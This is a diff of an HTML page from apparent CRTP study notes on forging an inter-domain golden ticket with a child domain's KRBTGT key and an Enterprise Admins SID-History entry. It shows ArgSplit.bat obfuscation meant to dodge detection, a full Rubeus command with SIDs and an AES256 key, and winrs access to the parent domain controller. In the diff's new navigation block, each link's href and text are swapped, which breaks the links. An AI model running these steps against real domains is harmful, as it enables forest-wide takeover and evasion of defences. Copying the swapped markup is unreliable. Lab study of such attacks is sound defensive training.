@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SID-History KRBTGT - CRTP</title>
+  <title>Enterprise Admin Trust - SID-History Abuse with KRBTGT hash - CRTP</title>
   <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -76,25 +76,25 @@
           <a href="../../" class="home-link">← Home</a>
           <a href="../../certifications/" class="home-link">← Certifications</a>
           <h3>Sections</h3>
-          <a href="enumeration.html" class="">Enumeration</a>
-          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
-          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
-          <a href="golden-ticket.html" class="">Golden Ticket</a>
-          <a href="silver-ticket.html" class="">Silver Ticket</a>
-          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
-          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
-          <a href="dcsync-attack.html" class="">DCSync Attack</a>
-          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
-          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
-          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
-          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
-          <a href="rbcd.html" class="">RBCD</a>
-          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
-          <a href="sid-history-krbtgt.html" class="active">SID-History KRBTGT</a>
-          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
-          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
-          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
-          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+          <a href="Enumeration" class="">enumeration.html</a>
+          <a href="Privilege Escalation" class="">privilege-escalation.html</a>
+          <a href="Privilege Escalation via Domain Admin session" class="">privilege-escalation-domain-admin.html</a>
+          <a href="Golden Ticket" class="">golden-ticket.html</a>
+          <a href="Silver Ticket" class="">silver-ticket.html</a>
+          <a href="Diamond Ticket" class="">diamond-ticket.html</a>
+          <a href="Abusing DSRM Credentials" class="">abusing-dsrm-credentials.html</a>
+          <a href="DCSync Attack" class="">dcsync-attack.html</a>
+          <a href="Security Descriptor Abuse" class="">security-descriptor-abuse.html</a>
+          <a href="ASREP-Roasting Attack" class="">asrep-roasting.html</a>
+          <a href="Unconstrained Delegation" class="">unconstrained-delegation.html</a>
+          <a href="Constrained Delegation" class="">constrained-delegation.html</a>
+          <a href="Resource-Based Constrained Delegation (RBCD)" class="">rbcd.html</a>
+          <a href="Enterprise Admins Trust - SID-History Abuse with Trust Ticket" class="">sid-history-trust-ticket.html</a>
+          <a href="Enterprise Admin Trust - SID-History Abuse with KRBTGT hash" class="">sid-history-krbtgt.html</a>
+          <a href="CrossForest Trust - Trust Flow" class="">cross-forest-trust.html</a>
+          <a href="ADCS Attacks" class="">adcs-attacks.html</a>
+          <a href="Trust Links Abuse" class="">trust-links-abuse.html</a>
+          <a href="MDE/MDI Bypass" class="">mde-mdi-bypass.html</a>
 
         </div>
         <div class="separator"></div>
@@ -114,63 +114,25 @@
 
     <div class="main-content">
       <article class="about active" data-page="about">
-        <header class="h2 article-title">SID-History KRBTGT</header>
+        <header class="h2 article-title">Enterprise Admin Trust - SID-History Abuse with KRBTGT hash</header>
         <section class="about-text">
           <div class="notion-content">
-<h3>SID-History Abuse with KRBTGT Hash</h3>
-<p>SID-History Abuse with KRBTGT hash is a technique used to escalate privileges and bypass access controls in Windows systems. It involves injecting higher-privileged SIDs into the SID History attribute of a user account, effectively granting the user the permissions associated with those higher-privileged groups.</p>
-<h3>How SID-History Abuse Works</h3>
-<ol>
-<li>
-<p>Compromising a Standard User Account: An attacker first compromises a standard user account with some level of privileges.</p>
-</li>
-<li>
-<p>Adding Higher-Privileged SIDs: The attacker then adds the SID of a higher-privileged group (such as Enterprise Admins or Domain Admins) to the SID History attribute of the compromised user account.</p>
-</li>
-<li>
-<p>Elevated Access: With the higher-privileged SIDs in the SID History, the user account now has elevated access to resources and systems within the parent domain.</p>
-</li>
-</ol>
-<h3>KRBTGT Hash Abuse</h3>
-<p>The KRBTGT hash is a critical component in the SID-History Abuse process. The KRBTGT hash is used to sign the Kerberos tickets, which are used to authenticate users and grant access to resources.</p>
-<h3>How KRBTGT Hash Abuse Works</h3>
-<ol>
-<li>
-<p>Compromising the KRBTGT Hash: An attacker compromises the KRBTGT hash, which is used to sign Kerberos tickets.</p>
-</li>
-<li>
-<p>Forging Kerberos Tickets: The attacker uses the compromised KRBTGT hash to forge Kerberos tickets that can be used to access resources across the domain.</p>
-</li>
-<li>
-<p>Elevated Access: With the forged Kerberos tickets, the attacker can access resources and systems within the domain, effectively bypassing normal access controls.</p>
-</li>
-</ol>
-<p>Assuming that we were able to compromise Domain Admin and we have KRBTGT hash dumped, it gets easy to abuse trusts used the KRBTGT.
-Having a session as Domain Admin, we can simply use Rubeus to abuse this SID-History with KRBTGT hash.</p>
-<p>With DCORP-DC(dollarcorp DC) KRBTGT secrets we can simply create a golden ticket and access MCORP-DC. I’ll be using AES256 key here.</p>
-<p>Let’s encode out Rubeus payload with Argsplit.bat and copy/paste it.</p>
-<p>ArgSplit.bat</p>
-<p><code>golden</code></p>
-<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
-<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">golden</span>
-<span class="nb">set </span><span class="s2">&quot;z=n&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=e&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=d&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;w=l&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;v=o&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;u=g&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p>Now let’s use Rubeus to forge our Golden Ticket and Access to Parent Domain Controller.</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt</code></p>
-<p>We can see above that our tickey has been successfully imported into our Cached Ticket
-We can double check out Cached Ticket witht <strong>klist</strong> command.</p>
-<p><code>klist</code></p>
-<p>We can confirm above that we do have a valid ticket into our Cached Tickets session.
-Now let’s access MDCORP-DC in moneycorp.local domain.</p>
-<p><code>winrs -r:mcorp-dc.moneycorp.local cmd</code></p>
-<p>Adn this way we were able to abuse SID-History with KRBTGT Hash.</p>
+<h3 class="" id="30c79e9a-d7c9-8090-a5ec-ed1d652a8338">SID-History Abuse with KRBTGT Hash</h3><p class="" id="30c79e9a-d7c9-80e4-b9c4-d4eb44fb61dc">SID-History Abuse with KRBTGT hash is a technique used to escalate privileges and bypass access controls in Windows systems. It involves injecting higher-privileged SIDs into the SID History attribute of a user account, effectively granting the user the permissions associated with those higher-privileged groups.</p><h3 class="" id="30c79e9a-d7c9-80ce-b55b-c035f139b54e">How SID-History Abuse Works</h3><ol class="numbered-list" id="30c79e9a-d7c9-805f-86e3-d55c90b1bb63" start="1" type="1"><li><strong>Compromising a Standard User Account</strong>: An attacker first compromises a standard user account with some level of privileges.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-807a-be4c-e8da4c08acbe" start="2" type="1"><li><strong>Adding Higher-Privileged SIDs</strong>: The attacker then adds the SID of a higher-privileged group (such as Enterprise Admins or Domain Admins) to the SID History attribute of the compromised user account.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80e2-8dc8-e999aba146ee" start="3" type="1"><li><strong>Elevated Access</strong>: With the higher-privileged SIDs in the SID History, the user account now has elevated access to resources and systems within the parent domain.</li></ol><h3 class="" id="30c79e9a-d7c9-80ec-9b7f-c96c401652ce">KRBTGT Hash Abuse</h3><p class="" id="30c79e9a-d7c9-8053-a58e-d69ac27274f6">The KRBTGT hash is a critical component in the SID-History Abuse process. The KRBTGT hash is used to sign the Kerberos tickets, which are used to authenticate users and grant access to resources.</p><h3 class="" id="30c79e9a-d7c9-8025-9834-fe569037ed01">How KRBTGT Hash Abuse Works</h3><ol class="numbered-list" id="30c79e9a-d7c9-80bd-abb5-c7160ac59542" start="1" type="1"><li><strong>Compromising the KRBTGT Hash</strong>: An attacker compromises the KRBTGT hash, which is used to sign Kerberos tickets.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80cb-9174-cb9d2b49a4b6" start="2" type="1"><li><strong>Forging Kerberos Tickets</strong>: The attacker uses the compromised KRBTGT hash to forge Kerberos tickets that can be used to access resources across the domain.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8086-8c8d-cf6cb6ffb8da" start="3" type="1"><li><strong>Elevated Access</strong>: With the forged Kerberos tickets, the attacker can access resources and systems within the domain, effectively bypassing normal access controls.</li></ol><p class="" id="30c79e9a-d7c9-80b7-a7b3-fc875a2a7e73">
+</p><p class="" id="30c79e9a-d7c9-80d0-9d59-d622d3d87d81">Assuming that we were able to compromise Domain Admin and we have KRBTGT hash dumped, it gets easy to abuse trusts used the KRBTGT.<br/>Having a session as Domain Admin, we can simply use Rubeus to abuse this SID-History with KRBTGT hash.</p><p class="" id="30c79e9a-d7c9-80c6-a368-c923d84fae7a">
+</p><p class="" id="30c79e9a-d7c9-80a9-8494-f1e759ec0fe9">With DCORP-DC(dollarcorp DC) KRBTGT secrets we can simply create a golden ticket and access MCORP-DC. I’ll be using AES256 key here.</p><p class="" id="30c79e9a-d7c9-805f-be5d-c6ea58f96c21">
+</p><p class="" id="30c79e9a-d7c9-80fd-90dc-cb6375f4114f">Let’s encode out Rubeus payload with Argsplit.bat and copy/paste it.</p><p class="" id="30c79e9a-d7c9-80e5-840a-ce96ccc8dda0">ArgSplit.bat</p><p class="" id="30c79e9a-d7c9-80ee-a367-f37ca3dc9a5b"><code>golden</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80ef-a084-fc4af2ab6fa6"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">[!] Argument Limit: 180 characters
+[+] Enter a string: golden
+set "z=n"
+set "y=e"
+set "x=d"
+set "w=l"
+set "v=o"
+set "u=g"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-80f7-b0e0-c3358ce3d8e7">
+</p><p class="" id="30c79e9a-d7c9-8017-9806-f55efe3d813d">Now let’s use Rubeus to forge our Golden Ticket and Access to Parent Domain Controller.</p><p class="" id="30c79e9a-d7c9-80f1-939a-ef612c59afb7"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt</code></p><a href="../../assets/crtp/Untitled 128.png"><img src="../../assets/crtp/Untitled 128.png"/></a><p class="" id="30c79e9a-d7c9-8061-8c06-d6974aa46fed">We can see above that our tickey has been successfully imported into our Cached Ticket<br/>We can double check out Cached Ticket witht <strong>klist</strong> command.</p><p class="" id="30c79e9a-d7c9-802b-a0a4-c4c2e40c2551">
+</p><p class="" id="30c79e9a-d7c9-80ce-91a4-cf5d1e429ced"><code>klist</code></p><a href="../../assets/crtp/Untitled 129.png"><img src="../../assets/crtp/Untitled 129.png"/></a><p class="" id="30c79e9a-d7c9-8040-81f8-c306110782c8">We can confirm above that we do have a valid ticket into our Cached Tickets session.<br/>Now let’s access MDCORP-DC in moneycorp.local domain.</p><p class="" id="30c79e9a-d7c9-80e6-8be8-c063947558a8">
+</p><p class="" id="30c79e9a-d7c9-80c6-9bac-efdb38b2f6f9"><code>winrs -r:mcorp-dc.moneycorp.local cmd</code></p><a href="../../assets/crtp/Untitled 130.png"><img src="../../assets/crtp/Untitled 130.png"/></a><p class="" id="30c79e9a-d7c9-80a3-bb4e-e9af98ba0a95">Adn this way we were able to abuse SID-History with KRBTGT Hash.</p><p class="" id="30c79e9a-d7c9-803f-8344-ee61c972e557">
+</p>
           </div>
         </section>
       </article>
